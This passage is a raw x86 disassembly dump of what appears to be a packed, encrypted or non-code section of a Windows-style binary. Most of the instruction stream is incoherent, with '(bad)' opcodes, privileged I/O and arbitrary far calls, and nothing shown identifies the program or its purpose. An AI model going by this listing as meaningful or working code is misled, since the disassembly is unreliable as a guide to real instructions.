  40a48f:	adc    BYTE PTR [ecx-0x5c91bc8f],bl
  40a495:	jecxz  0x40a441
  40a497:	mov    ch,ah
  40a499:	out    dx,al
  40a49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a49b:	or     ah,ch
  40a49d:	add    eax,0x913850f9
  40a4a2:	aad    0xb0
  40a4a4:	mov    ebp,0x9d1ce74d
  40a4a9:	ret    0xdb46
  40a4ac:	shr    DWORD PTR [ebx],1
  40a4ae:	call   0x7072:0x5e0c2b77
  40a4b5:	or     edx,0x77297d97
  40a4bb:	mov    ds:0xfdec7801,eax
  40a4c0:	fdivr  DWORD PTR [edi]
  40a4c2:	add    DWORD PTR [edi],0x72ffdf02
  40a4c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c9:	lods   al,BYTE PTR ds:[esi]
  40a4ca:	or     eax,0x81b1363d
  40a4cf:	xor    BYTE PTR [ecx-0x5242c7d0],dh
  40a4d5:	add    al,0x23
  40a4d7:	or     eax,0xc8ef1154
  40a4dc:	mov    al,ds:0x7a298517
  40a4e1:	push   ds
  40a4e2:	pop    edi
  40a4e3:	daa    
  40a4e4:	mov    ch,0x4b
  40a4e6:	mov    ds,edx
  40a4e8:	push   cs
  40a4e9:	cmc    
  40a4ea:	nop
  40a4eb:	out    0x51,al
  40a4ed:	inc    ebx
  40a4ee:	repnz push cs
  40a4f0:	fiadd  DWORD PTR [edx+0x40c68851]
  40a4f6:	adc    esp,DWORD PTR [eax+0x6e]
  40a4f9:	dec    edx
  40a4fa:	push   ss
  40a4fb:	add    cl,BYTE PTR [eax+ecx*8]
  40a4fe:	pop    esi
  40a4ff:	jl     0x40a4ad
  40a501:	cmp    ebx,esi
  40a503:	ins    DWORD PTR es:[edi],dx
  40a504:	sub    BYTE PTR [edi],ah
  40a506:	xchg   esp,eax
  40a507:	cmp    DWORD PTR [esp+edi*1+0x1b],esi
  40a50b:	dec    esp
  40a50c:	xor    al,0x6e
  40a50e:	and    BYTE PTR [edi-0x25],0x59
  40a512:	or     edx,DWORD PTR [edx-0x7c]
  40a515:	cmp    BYTE PTR [ebx-0x58791d8b],0x8d
  40a51c:	mov    edx,0xc7809cfd
  40a522:	dec    ecx
  40a523:	push   eax
  40a524:	loop   0x40a4f3
  40a526:	sbb    ecx,edi
  40a528:	stc    
  40a529:	pop    esi
  40a52a:	cld    
  40a52b:	and    bh,BYTE PTR [edi-0x4e]
  40a52e:	xchg   ecx,eax
  40a52f:	outs   dx,BYTE PTR ds:[esi]
  40a530:	add    eax,0x60affb00
  40a535:	xor    dh,0xf9
  40a538:	cli    
  40a539:	popa   
  40a53a:	dec    edx
  40a53b:	in     eax,0x59
  40a53d:	xchg   ebp,eax
  40a53e:	push   eax
  40a53f:	sahf   
  40a540:	out    dx,eax
  40a541:	push   ebp
  40a542:	cli    
  40a543:	cmp    eax,0x647f2c56
  40a548:	fwait
  40a549:	push   es
  40a54a:	cmp    eax,0xc1caa856
  40a54f:	stos   DWORD PTR es:[edi],eax
  40a550:	xor    al,0xf0
  40a552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a553:	imul   esi,DWORD PTR [ebp+0x71ccf466],0xe4b3cf51
  40a55d:	sti    
  40a55e:	add    eax,0x4ffa7a7e
  40a563:	mov    ecx,0x5d843c4b
  40a568:	mov    esp,0xefb5f7a8
  40a56d:	mov    edx,0xee3344d1
  40a572:	outs   dx,BYTE PTR ds:[esi]
  40a573:	cdq    
  40a574:	push   esp
  40a575:	adc    bh,BYTE PTR [ebx]
  40a577:	mov    bh,0x18
  40a579:	sub    BYTE PTR [edi-0x240a5966],dl
  40a57f:	or     al,0xf9
  40a581:	int3   
  40a582:	add    ah,BYTE PTR [edi+eax*1-0x4f]
  40a586:	add    dl,BYTE PTR [eax+0x6a]
  40a589:	sti    
  40a58a:	in     al,dx
  40a58b:	add    dh,BYTE PTR [eax]
  40a58d:	inc    edx
  40a58e:	loop   0x40a570
  40a590:	mov    edi,0xbd976565
  40a595:	je     0x40a53b
  40a597:	xchg   esp,eax
  40a598:	adc    eax,0x1ee7c28c
  40a59d:	cmc    
  40a59e:	or     al,0xad
  40a5a0:	mov    edi,0x9d0b65df
  40a5a5:	ds pop ecx
  40a5a7:	and    ebx,DWORD PTR [ebp-0x65]
  40a5aa:	inc    edi
  40a5ac:	or     DWORD PTR [ebp+0x23477f52],0x63
  40a5b3:	stos   DWORD PTR es:[edi],eax
  40a5b4:	xor    esp,edx
  40a5b6:	(bad)  
  40a5b7:	aaa    
  40a5b8:	inc    ebx
  40a5b9:	repnz fild DWORD PTR [ebp-0x59]
  40a5bd:	jge    0x40a57c
  40a5bf:	stos   DWORD PTR es:[edi],eax
  40a5c0:	push   ebp
  40a5c1:	dec    esi
  40a5c2:	ret    
  40a5c3:	ja     0x40a5f6
  40a5c5:	or     al,0xf2
  40a5c7:	ret    0x5af0
  40a5ca:	sbb    DWORD PTR [esi+0x7201d235],esi
  40a5d0:	inc    esp
  40a5d1:	mov    bl,0x78
  40a5d3:	xor    esi,DWORD PTR ds:0xf0defdd7
  40a5d9:	push   esi
  40a5da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5dc:	jnp    0x40a5f7
  40a5de:	dec    ecx
  40a5df:	(bad)  
  40a5e0:	das    
  40a5e1:	iret   
  40a5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e3:	push   0x5f
  40a5e5:	mov    edi,0x7c451351
  40a5ea:	inc    ecx
  40a5eb:	ss test al,0x2e
  40a5ee:	fucomp st(3)
  40a5f0:	xchg   esi,eax
  40a5f1:	sbb    DWORD PTR [edx],esi
  40a5f3:	ret    
  40a5f4:	add    BYTE PTR [edx-0x10],dl
  40a5f7:	jns    0x40a5e0
  40a5f9:	inc    ecx
  40a5fa:	mov    cl,0xaf
  40a5fc:	adc    eax,DWORD PTR [ebp+eax*1+0x43]
  40a600:	fnstenv [edi]
  40a602:	popf   
  40a603:	mov    cl,dl
  40a605:	push   esi
  40a606:	pop    edi
  40a607:	stos   DWORD PTR es:[edi],eax
  40a608:	hlt    
  40a609:	adc    BYTE PTR [ecx-0x18],0xea
  40a60d:	mov    DWORD PTR [ebx+0x335c2f78],ebp
  40a613:	shl    DWORD PTR [esi],1
  40a615:	mov    eax,ds:0xd5228fc8
  40a61a:	add    ebp,DWORD PTR [edx-0x1df62ec2]
  40a620:	das    
  40a621:	mov    edx,0x15a6de0c
  40a626:	(bad)  
  40a627:	icebp  
  40a628:	mov    ebx,0x2f224eac
  40a62d:	xlat   BYTE PTR ds:[ebx]
  40a62e:	jnp    0x40a648
  40a630:	in     al,dx
  40a631:	xchg   esi,eax
  40a632:	repz bound ecx,QWORD PTR [esi+ecx*2]
  40a636:	xor    bl,BYTE PTR ds:0x715179f5
  40a63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a63d:	xlat   BYTE PTR ds:[ebx]
  40a63e:	sbb    BYTE PTR [ebx+0x79],dl
  40a641:	cdq    
  40a642:	or     al,0x96
  40a644:	pop    edi
  40a645:	push   0x25
  40a647:	sbb    DWORD PTR [ebx+0xc77a0b8],ebp
  40a64d:	xor    al,0xb0
  40a64f:	pop    edx
  40a650:	adc    eax,0xdab2016f
  40a655:	mov    dh,0x6f
  40a657:	pop    edx
  40a658:	cli    
  40a659:	cmp    eax,0xaa9a3668
  40a65e:	repnz shr DWORD PTR [eax],1
  40a661:	xadd   DWORD PTR [edi],ebp
  40a664:	mov    esi,0xe11b8207
  40a669:	lea    ebp,ds:0x2e86712e
  40a66f:	bound  edi,QWORD PTR [eax]
  40a671:	or     eax,0xba401dd2
  40a676:	xchg   DWORD PTR [esi],edx
  40a678:	out    0x2d,al
  40a67a:	call   0x6e8fe229
  40a67f:	pop    ecx
  40a680:	clc    
  40a681:	cmp    al,0x44
  40a683:	mov    ah,0xb5
  40a685:	xor    al,0xf3
  40a687:	mov    al,ds:0xd001b0fe
  40a68c:	xor    ebp,DWORD PTR [edx+ebx*1-0x5c120528]
  40a693:	(bad)  
  40a694:	jnp    0x40a705
  40a696:	mov    eax,0xeb4f4d
  40a69c:	cmp    al,0xbc
  40a69e:	out    dx,eax
  40a69f:	adc    DWORD PTR [edx-0x42ce01a0],0xffffffc0
  40a6a6:	sub    al,0xff
  40a6a8:	leave  
  40a6a9:	jno    0x40a6be
  40a6ab:	ins    DWORD PTR es:[edi],dx
  40a6ac:	ins    DWORD PTR es:[edi],dx
  40a6ad:	fyl2x  
  40a6af:	(bad)  
  40a6b0:	icebp  
  40a6b1:	push   eax
  40a6b2:	xor    cl,bl
  40a6b4:	jnp    0x40a64b
  40a6b6:	cld    
  40a6b7:	fwait
  40a6b8:	and    bh,bh
  40a6ba:	fsub   DWORD PTR [ecx+0x34]
  40a6bd:	ins    DWORD PTR es:[edi],dx
  40a6be:	xchg   ebx,eax
  40a6bf:	add    DWORD PTR [edx-0x6dbfb670],ecx
  40a6c5:	out    dx,eax
  40a6c6:	push   ds
  40a6c7:	jo     0x40a694
  40a6c9:	std    
  40a6ca:	out    0x9d,al
  40a6cc:	push   eax
  40a6cd:	mov    ds:0xd59be563,eax
  40a6d2:	stos   DWORD PTR es:[edi],eax
  40a6d3:	shr    DWORD PTR [edx+0x3a5b5e8b],0x49
  40a6da:	xchg   ebx,eax
  40a6db:	add    eax,edi
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x0]
  40a6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6f0:	lods   eax,DWORD PTR ds:[esi]
  40a6f1:	adc    DWORD PTR [eax-0x17],edi
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	sbb    DWORD PTR [eax-0x779965de],ebx
  40a700:	out    dx,eax
  40a701:	mov    ebx,0x6ed0ce6
  40a706:	dec    al
  40a708:	fistp  WORD PTR [edx]
  40a70a:	xchg   edx,eax
  40a70b:	jnp    0x40a69f
  40a70d:	mov    eax,ds:0xb82e3e79
  40a712:	ja     0x40a712
  40a714:	sbb    BYTE PTR [edx-0x34],0x62
  40a718:	in     eax,dx
  40a719:	lds    ebx,FWORD PTR [ebp+0x13]
  40a71c:	pop    edi
  40a71d:	ret    0x7eea
  40a720:	rcl    DWORD PTR [edi],1
  40a722:	mov    ecx,0x57af27a1
  40a727:	or     al,0x44
  40a729:	xchg   ebx,eax
  40a72a:	xor    ecx,DWORD PTR [edx-0xb]
  40a72d:	(bad)  
  40a72e:	call   0x8e06:0x41bf531d
  40a735:	jo     0x40a79d
  40a737:	mul    DWORD PTR [esi+0x1e]
  40a73a:	add    DWORD PTR [edx+0x7f],edx
  40a73d:	adc    cl,BYTE PTR [esi+0x56f53171]
  40a743:	out    dx,al
  40a744:	shr    BYTE PTR [edi-0x2c],0xb8
  40a748:	dec    ebp
  40a749:	nop
  40a74a:	lea    ecx,[esi-0x2bb9541e]
  40a750:	adc    eax,0x544b0bc
  40a755:	mov    ah,0x6b
  40a757:	ins    BYTE PTR es:[edi],dx
  40a758:	mov    ebp,es
  40a75a:	sar    ch,0xc7
  40a75d:	add    cl,BYTE PTR [eax+0x17]
  40a760:	adc    eax,0x21b3e81d
  40a765:	cwde   
  40a766:	ret    
  40a767:	jne    0x40a6f3
  40a769:	or     bl,0xe3
  40a76c:	js     0x40a703
  40a76e:	dec    edi
  40a76f:	in     al,0xd
  40a771:	xchg   edi,eax
  40a772:	xlat   BYTE PTR ds:[ebx]
  40a773:	icebp  
  40a774:	dec    ecx
  40a775:	add    DWORD PTR [ecx+esi*2-0x5718351b],ebx
  40a77c:	fld    DWORD PTR [edi-0x2e0f627d]
  40a782:	push   ds
  40a783:	call   0xe56f:0xb373158
  40a78a:	addr16 push ss
  40a78c:	fist   DWORD PTR [esi+0x6f3edac9]
  40a792:	xchg   ebx,eax
  40a793:	stos   BYTE PTR es:[edi],al
  40a794:	jbe    0x40a785
  40a796:	sahf   
  40a797:	gs and bl,ch
  40a79a:	push   edx
  40a79b:	fst    QWORD PTR [ecx+0x3261f8aa]
  40a7a1:	stos   DWORD PTR es:[edi],eax
  40a7a2:	jle    0x40a770
  40a7a4:	push   0xe4401411
  40a7a9:	pop    edi
  40a7aa:	jbe    0x40a7f0
  40a7ac:	imul   ebp,ebx,0xffffffe3
  40a7af:	fmul   QWORD PTR ss:[ebx]
  40a7b2:	outs   dx,BYTE PTR ds:[esi]
  40a7b3:	push   ebp
  40a7b4:	mov    ah,0xfa
  40a7b6:	aam    0x49
  40a7b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7b9:	jbe    0x40a7d3
  40a7bb:	sar    DWORD PTR [esi-0x7a4ed130],cl
  40a7c1:	push   ecx
  40a7c2:	test   eax,0x987bc681
  40a7c7:	inc    ebp
  40a7c8:	mov    ds:0xabb18fee,eax
  40a7cd:	or     al,0x59
  40a7cf:	cmc    
  40a7d0:	mov    al,ds:0x152c16e7
  40a7d5:	stos   DWORD PTR es:[edi],eax
  40a7d6:	std    
  40a7d7:	pop    ds
  40a7d8:	mov    ds:0xadbf9dfd,al
  40a7dd:	push   ss
  40a7de:	icebp  
  40a7df:	imul   edi,esp,0x90602927
  40a7e5:	jbe    0x40a827
  40a7e7:	sahf   
  40a7e8:	xor    BYTE PTR [ecx],ah
  40a7ea:	inc    esi
  40a7eb:	adc    BYTE PTR [ebx],ch
  40a7ed:	adc    ch,BYTE PTR [edi-0x4b70097]
  40a7f3:	jmp    0x40a81c
  40a7f5:	xchg   ecx,eax
  40a7f6:	mov    al,ds:0xf9cbff06
  40a7fb:	mov    eax,ds:0xd7380611
  40a800:	sbb    esp,DWORD PTR [edx-0x47]
  40a803:	stos   BYTE PTR es:[edi],al
  40a804:	push   eax
  40a805:	pop    DWORD PTR [edi+edx*4-0x16]
  40a809:	daa    
  40a80a:	xor    bl,BYTE PTR [edi-0x29]
  40a80d:	pop    es
  40a80e:	fild   DWORD PTR [ebx-0x73b1131]
  40a814:	repnz mov ds:0xaf1da724,al
  40a81a:	ja     0x40a7a7
  40a81c:	xor    al,0x77
  40a81e:	or     ebp,0xffffffb6
  40a821:	mov    esi,0xe292e0cd
  40a826:	bnd jg 0x40a82a
  40a829:	and    eax,0xc9cabf39
  40a82e:	dec    edx
  40a82f:	out    0x28,eax
  40a831:	xor    bh,BYTE PTR [esi+0x4ad8af2f]
  40a837:	fild   QWORD PTR [edx]
  40a839:	sar    eax,cl
  40a83b:	mov    al,0x91
  40a83d:	mov    bl,0x5e
  40a83f:	push   ebp
  40a840:	cdq    
  40a841:	dec    eax
  40a842:	push   ecx
  40a843:	sub    al,0xbe
  40a845:	mov    DWORD PTR [eax-0x24],esp
  40a848:	xor    eax,0xe5d39b7c
  40a84d:	shl    ebp,0xff
  40a850:	push   esi
  40a851:	fwait
  40a852:	jae    0x40a81d
  40a854:	fcom   QWORD PTR cs:[ebp+eiz*4+0x40]
  40a859:	ret    0x499e
  40a85c:	inc    BYTE PTR [esi+0x5759ccb8]
  40a862:	sbb    ebx,DWORD PTR [edi-0x11c3741]
  40a868:	addr16 into 
  40a86a:	nop
  40a86b:	mov    edx,0x54da1dc6
  40a870:	dec    edx
  40a871:	mov    ah,0xa
  40a873:	jno    0x40a83c
  40a875:	or     ebp,DWORD PTR [edx+0x3e]
  40a878:	aas    
  40a879:	rol    BYTE PTR ds:0x1e124cca,1
  40a87f:	gs pop ebx
  40a881:	out    dx,al
  40a882:	adc    bh,dl
  40a884:	shl    BYTE PTR [esi+0x56],0xd0
  40a888:	js     0x40a859
  40a88a:	pop    ss
  40a88b:	cmp    ch,ah
  40a88d:	gs adc eax,0xa1f69327
  40a893:	dec    ecx
  40a894:	lea    edx,[eax]
  40a896:	add    ecx,DWORD PTR [ebx]
  40a898:	or     esp,DWORD PTR [ecx+0x4d]
  40a89b:	fmul   QWORD PTR [edi-0x69]
  40a89e:	pop    es
  40a89f:	pop    esi
  40a8a0:	cmp    eax,DWORD PTR [eax]
  40a8a2:	shl    DWORD PTR [edi],1
  40a8a4:	adc    DWORD PTR [ebx-0x35],0x17bcfa7
  40a8ab:	mov    bh,0x9b
  40a8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ae:	mov    ch,0xda
  40a8b0:	fdiv   DWORD PTR [si]
  40a8b3:	icebp  
  40a8b4:	scas   al,BYTE PTR es:[edi]
  40a8b5:	jge    0x40a92a
  40a8b7:	inc    edi
  40a8b8:	adc    eax,0x91c61ee6
  40a8bd:	pop    edi
  40a8be:	inc    ebp
  40a8bf:	push   es
  40a8c0:	xchg   edi,eax
  40a8c1:	adc    DWORD PTR [ebp-0xb],ebx
  40a8c4:	mov    ds:0x51e4d14e,eax
  40a8c9:	mov    eax,0xfe9a5c72
  40a8ce:	sub    dh,BYTE PTR [eax]
  40a8d0:	mov    edi,0xf864c14
  40a8d5:	add    dl,BYTE PTR [eax+0x76999cee]
  40a8db:	fmul   st(0),st
  40a8dd:	dec    edx
  40a8de:	mov    ebx,0xc8c7341
  40a8e3:	inc    ebx
  40a8e4:	stos   DWORD PTR es:[edi],eax
  40a8e5:	dec    ebx
  40a8e6:	loopne 0x40a8d4
  40a8e8:	push   edx
  40a8e9:	push   0x41
  40a8eb:	cmp    dl,BYTE PTR [esi+0x4d]
  40a8ee:	add    al,0x8
  40a8f0:	xchg   ebp,eax
  40a8f1:	mov    esi,0x8965f739
  40a8f6:	retf   0xc9ce
  40a8f9:	hlt    
  40a8fa:	adc    eax,DWORD PTR [ebx-0x35]
  40a8fd:	push   0x373f5ffa
  40a902:	ret    
  40a903:	jne    0x40a897
  40a905:	xor    BYTE PTR [edi],0xa4
  40a908:	xchg   ebp,eax
  40a909:	jl     0x40a891
  40a90b:	mov    edx,0xb8d21bdb
  40a910:	fild   QWORD PTR [ebp+ebp*2-0x35]
  40a914:	loope  0x40a8e0
  40a916:	stos   BYTE PTR es:[edi],al
  40a917:	inc    eax
  40a918:	xchg   ebp,eax
  40a919:	call   0x97c0:0xa476b665
  40a920:	or     ah,BYTE PTR [ebx-0x50]
  40a923:	push   ebp
  40a924:	hlt    
  40a925:	mov    ebx,0xfee83a6e
  40a92a:	addr16 aas 
  40a92c:	call   0xb031ec3
  40a931:	arpl   WORD PTR [ebp+0x1d0f3d3e],si
  40a937:	pop    ebp
  40a938:	add    BYTE PTR [edx-0x7e420159],dh
  40a93e:	add    DWORD PTR [eax-0x68],eax
  40a941:	clc    
  40a942:	clc    
  40a943:	bound  esp,QWORD PTR es:[edx]
  40a946:	jge    0x40a944
  40a948:	jg     0x40a9be
  40a94a:	aam    0x94
  40a94c:	jb     0x40a99c
  40a94e:	sbb    eax,0xcc9473fb
  40a953:	adc    ecx,DWORD PTR [ecx+ebx*8]
  40a956:	jne    0x40a959
  40a958:	dec    ebx
  40a959:	push   ecx
  40a95a:	mov    bh,0x16
  40a95c:	cmp    DWORD PTR [eax],esi
  40a95e:	ja     0x40a99c
  40a960:	dec    ebp
  40a961:	xchg   si,ax
  40a963:	inc    eax
  40a964:	inc    edx
  40a965:	jmp    0x40a991
  40a967:	and    eax,0x1df7c7bb
  40a96c:	push   ebp
  40a96d:	mov    edi,0xf32d774f
  40a972:	cld    
  40a973:	cmp    ebp,ebp
  40a975:	in     eax,dx
  40a976:	push   eax
  40a977:	xchg   ebp,eax
  40a978:	xchg   ebx,eax
  40a979:	cli    
  40a97a:	fs push ds
  40a97c:	mov    dh,0xbb
  40a97e:	jecxz  0x40a923
  40a980:	xchg   edx,eax
  40a981:	in     al,0x46
  40a983:	test   DWORD PTR [edx-0x43],0x4b4ef251
  40a98a:	shl    BYTE PTR [ebp-0x10],cl
  40a98d:	push   ebx
  40a98e:	repz push esi
  40a990:	int    0x9b
  40a992:	(bad)
  40a995:	stos   DWORD PTR es:[edi],eax
  40a996:	and    ch,BYTE PTR [eax-0x77cdd9c3]
  40a99c:	hlt    
  40a99d:	icebp  
  40a99e:	add    eax,0x47bf9d7c
  40a9a3:	mov    al,0xd7
  40a9a5:	scas   eax,DWORD PTR es:[edi]
  40a9a6:	shr    DWORD PTR ds:0x9763b3bf,cl
  40a9ac:	lea    ebx,[edx+0x27]
  40a9af:	call   0x411a:0x8fa3b475
  40a9b6:	fdiv   QWORD PTR [ecx+0x22]
  40a9b9:	sti    
  40a9ba:	xchg   edi,eax
  40a9bb:	or     al,0xcc
  40a9bd:	stos   BYTE PTR es:[edi],al
  40a9be:	dec    esp
  40a9bf:	pop    esp
  40a9c0:	dec    ecx
  40a9c1:	cmp    edx,edx
  40a9c3:	test   al,0x57
  40a9c5:	xchg   ebx,eax
  40a9c6:	clc    
  40a9c7:	sar    DWORD PTR [edx-0x4d3ffc69],0xc3
  40a9ce:	sbb    ecx,DWORD PTR [ebx-0x42]
  40a9d1:	rcr    edx,cl
  40a9d3:	and    ebx,esi
  40a9d5:	ja     0x40aa23
  40a9d7:	aad    0xfe
  40a9d9:	int3   
  40a9da:	sbb    eax,0x56528b8b
  40a9df:	xchg   ecx,eax
  40a9e0:	sahf   
  40a9e1:	sar    DWORD PTR [edi+0x15],cl
  40a9e4:	leave  
  40a9e5:	pop    edi
  40a9e6:	(bad)  
  40a9e8:	sahf   
  40a9e9:	pop    edi
  40a9ea:	push   ss
  40a9eb:	out    0xf1,eax
  40a9ed:	out    dx,eax
  40a9ee:	push   ss
  40a9ef:	aaa    
  40a9f0:	pop    esi
  40a9f1:	dec    esi
  40a9f2:	jmp    0x40a9d6
  40a9f4:	adc    al,0xba
  40a9f6:	loope  0x40aa54
  40a9f8:	imul   esp,DWORD PTR [esi-0x22],0x39d7dfc3
  40a9ff:	add    DWORD PTR [edi],ecx
  40aa01:	test   BYTE PTR [edx],ah
  40aa03:	adc    BYTE PTR [eax],al
  40aa05:	add    BYTE PTR [ebx+0x458bec4d],cl
  40aa0b:	clc    
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    edi,edi
  40aa2a:	lea    eax,[ebx+0x40]
  40aa2d:	add    al,0xf4
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	xchg   ecx,eax
  40aa36:	cli    
  40aa37:	jae    0x40aa3b
  40aa39:	sub    esi,DWORD PTR [ecx+0x74b36f8f]
  40aa3f:	fcmovne st,st(2)
  40aa41:	js     0x40aa3e
  40aa43:	cmp    eax,0xc13ce3cf
  40aa48:	mov    edx,0x7b1797e8
  40aa4d:	repz arpl WORD PTR [ebp-0x16],bx
  40aa51:	int    0xf9
  40aa53:	mov    BYTE PTR [ecx],dl
  40aa55:	xor    al,0x11
  40aa57:	add    DWORD PTR [esi+0x2e26b215],edx
  40aa5d:	mov    ebp,0xd03d7cc6
  40aa62:	mov    bh,0x10
  40aa64:	pop    ss
  40aa65:	and    BYTE PTR [edi+0x1f59c3f0],dl
  40aa6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa6c:	adc    DWORD PTR [ecx+ebp*8-0x52],edi
  40aa70:	lea    ebp,[edi]
  40aa72:	into   
  40aa73:	(bad)  
  40aa74:	(bad)  
  40aa75:	fld    DWORD PTR [ecx+0x5f536564]
  40aa7b:	in     al,dx
  40aa7c:	push   0xc84e0d9d
  40aa81:	xchg   esi,eax
  40aa82:	mov    eax,ds:0x62f1e327
  40aa87:	ins    BYTE PTR es:[edi],dx
  40aa88:	sub    eax,0x70618749
  40aa8d:	push   0xfffffffe
  40aa8f:	push   ebx
  40aa90:	mov    ecx,0x7232aceb
  40aa95:	mov    ch,0x9f
  40aa97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa98:	adc    dl,BYTE PTR ss:[edi]
  40aa9b:	loopne 0x40aa67
  40aa9d:	xor    dl,cl
  40aa9f:	test   al,0x24
  40aaa1:	fnstcw WORD PTR [edi+eiz*1-0x599ff3a3]
  40aaa8:	gs inc ebx
  40aaaa:	or     al,0xfc
  40aaac:	mov    bh,0x3d
  40aaae:	fdiv   DWORD PTR [eax+0x4293ea3a]
  40aab4:	(bad)  
  40aab5:	div    DWORD PTR [edi+0x3578e292]
  40aabb:	cs jmp 0x14e59d51
  40aac1:	mov    dh,0xd1
  40aac3:	scas   al,BYTE PTR es:[edi]
  40aac4:	add    eax,0xcf5784f6
  40aac9:	lock adc BYTE PTR [esp+eax*4],0x74
  40aace:	pop    ss
  40aacf:	sbb    cl,BYTE PTR [eax]
  40aad1:	loopne 0x40aada
  40aad3:	push   0x2aacf34e
  40aad8:	mov    eax,0x1611d9c8
  40aadd:	test   DWORD PTR [eax+0x22435136],0xb0097b05
  40aae7:	cmp    DWORD PTR [ecx],eax
  40aae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaea:	fisttp WORD PTR [ebx+0x6a]
  40aaed:	outs   dx,BYTE PTR ds:[esi]
  40aaee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaef:	outs   dx,DWORD PTR ds:[esi]
  40aaf0:	mov    DWORD PTR [ebp-0x8],edi
  40aaf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaf4:	xchg   esp,eax
  40aaf5:	fwait
  40aaf6:	pop    edi
  40aaf7:	add    dh,0xc8
  40aafa:	mov    dh,dl
  40aafc:	cmp    al,0xf
  40aafe:	mov    bl,0x5b
  40ab00:	add    al,ch
  40ab02:	or     al,ah
  40ab04:	xor    DWORD PTR [edx-0x39dcd81],esp
  40ab0a:	sbb    al,0xbe
  40ab0c:	in     eax,dx
  40ab0d:	js     0x40aaa2
  40ab0f:	pusha  
  40ab10:	add    ebx,ebp
  40ab12:	dec    ebx
  40ab13:	call   0x8fbb7044
  40ab18:	dec    edx
  40ab19:	and    al,0x95
  40ab1b:	or     DWORD PTR [ebx+0x4],edi
  40ab1e:	adc    al,0x1a
  40ab20:	or     BYTE PTR [eax+ebx*2],0x91
  40ab24:	fbld   TBYTE PTR [edi+eiz*2-0x4d]
  40ab28:	sub    dh,dl
  40ab2a:	jne    0x40ab8e
  40ab2c:	int    0xe4
  40ab2e:	push   eax
  40ab2f:	stc    
  40ab30:	out    dx,eax
  40ab31:	pop    eax
  40ab32:	or     ch,dl
  40ab34:	push   ebx
  40ab35:	push   ss
  40ab36:	stos   BYTE PTR es:[edi],al
  40ab37:	ins    DWORD PTR es:[edi],dx
  40ab38:	fisubr DWORD PTR [ecx]
  40ab3a:	pop    es
  40ab3b:	mov    bh,0x94
  40ab3d:	push   edx
  40ab3e:	adc    eax,0x1fd3ede1
  40ab43:	add    al,0x6e
  40ab45:	cs add eax,0x32e5b2fc
  40ab4b:	in     al,0x97
  40ab4d:	hlt    
  40ab4e:	test   DWORD PTR [esi],esp
  40ab50:	into   
  40ab51:	ss adc eax,0x8760bbe7
  40ab57:	mov    ah,0x60
  40ab59:	aas    
  40ab5a:	mov    esi,0xbdcf7371
  40ab5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab60:	cmp    BYTE PTR [ebx],ch
  40ab62:	jo     0x40ab4d
  40ab64:	(bad)
  40ab67:	fwait
  40ab68:	mov    al,ds:0xb2908ad5
  40ab6d:	pop    es
  40ab6e:	stos   DWORD PTR es:[edi],eax
  40ab6f:	fst    DWORD PTR [edx-0xa]
  40ab72:	out    dx,eax
  40ab73:	fadd   QWORD PTR [edi+0x26cb00dd]
  40ab79:	scas   eax,DWORD PTR es:[edi]
  40ab7a:	inc    esp
  40ab7b:	cmp    DWORD PTR [ecx+0x2a55a3dc],edx
  40ab81:	cmp    bl,cl
  40ab83:	shl    BYTE PTR [edi+0x2a8712e7],1
  40ab89:	adc    ch,dl
  40ab8b:	mov    DWORD PTR [ebx-0x1],ebp
  40ab8e:	push   0x1c377ede
  40ab93:	std    
  40ab94:	imul   edx,DWORD PTR [edi-0x75],0xeac8a643
  40ab9b:	sbb    al,0x62
  40ab9d:	or     bh,BYTE PTR [edx-0x1d7643a7]
  40aba3:	mov    BYTE PTR [ecx-0x3b],bl
  40aba6:	xor    al,BYTE PTR [edi+0x38]
  40aba9:	inc    ebp
  40abaa:	inc    ebx
  40abab:	enter  0x2319,0xd9
  40abaf:	test   DWORD PTR [ecx],ebp
  40abb1:	cmp    esi,DWORD PTR [eax-0x105e5bc8]
  40abb7:	adc    ebp,0xffffff83
  40abba:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40abbc:	and    esp,edi
  40abbe:	sub    bl,BYTE PTR [esi+0x13f99321]
  40abc4:	sub    BYTE PTR [ecx+0x12],cl
  40abc7:	fisttp DWORD PTR [ecx-0x2872bcdd]
  40abcd:	mov    ebp,0x66f8a3a7
  40abd2:	loopne 0x40ac49
  40abd4:	aaa    
  40abd5:	and    eax,0xee6a73b5
  40abda:	mov    bh,0x1a
  40abdc:	inc    edx
  40abdd:	(bad)  
  40abde:	sbb    BYTE PTR [ecx-0x5f],0xf5
  40abe2:	mov    ebx,0x87958b9d
  40abe7:	add    BYTE PTR [esi+0x6167086b],dl
  40abed:	or     al,0x8e
  40abef:	mov    esp,edx
  40abf1:	xchg   BYTE PTR [ecx+0x76],bl
  40abf4:	mov    eax,0xa017071c
  40abf9:	gs push edx
